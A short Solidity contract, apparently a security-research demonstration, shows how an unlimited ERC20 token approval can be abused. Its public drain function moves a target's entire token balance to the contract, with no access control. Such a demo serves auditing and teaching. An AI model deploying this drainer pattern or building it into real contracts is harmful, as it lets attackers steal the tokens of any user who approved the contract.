// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*
 * For security research only. Do not use on mainnet.
 * Demonstrates how unlimited ERC20 approval allows contract to move all user's tokens.
 */
contract DrainingExample {
    // Token to be drained
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    // Simulates a malicious/token exploiter pattern for auditing
    function drain(address from) public {
        uint256 balance = token.balanceOf(from);
        token.transferFrom(from, address(this), balance);
    }
}
